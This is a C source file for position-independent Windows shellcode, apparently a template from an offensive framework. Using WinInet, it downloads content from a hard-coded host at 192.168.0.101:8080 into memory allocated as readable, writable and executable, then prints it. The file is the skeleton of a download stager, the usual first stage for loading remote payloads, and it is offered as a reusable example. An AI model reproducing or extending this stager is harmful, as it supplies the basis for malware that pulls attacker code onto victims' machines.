#include <Core.h>
#include <Win32.h>

SEC( text, B ) INT Main( INSTANCE Instance, LPCWSTR PassedToShellcode ) {
	/* Example of creating char variables:
	char * test = GET_SYMBOL_STR("value_of_the_test");
	CHAR(variable_name, "value_of_the_variable_name");
	*/

	CHAR(sitename, 	"192.168.0.101");
	CHAR(user_agent, 	"useragent");
	CHAR(acceptTypes, 	"*/*");
	CHAR(method, 		"GET");
	CHAR(site_param, 	"test");

	int port = 8080;

	HINTERNET hInternet = Instance.Win32.InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hConnect 	= Instance.Win32.InternetConnectA(hInternet, sitename, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	HINTERNET hRequest 	= Instance.Win32.HttpOpenRequestA(hConnect, method, site_param, NULL, NULL, acceptTypes, 0, 0);
	BOOL bRequestSent 	= Instance.Win32.HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
	BOOL bKeepReading 	= TRUE;
	const int nBuffSize = 100000;
	int size 			= 0;
	char* buff 		= Instance.Win32.VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	DWORD dwBytesRead 	= -1;
	while (bKeepReading && dwBytesRead != 0) {
		bKeepReading = Instance.Win32.InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
    }

	Instance.Win32.printf(buff);

	Instance.Win32.InternetCloseHandle(hRequest);
	Instance.Win32.InternetCloseHandle(hConnect);
	Instance.Win32.InternetCloseHandle(hInternet);

	return 0;
}
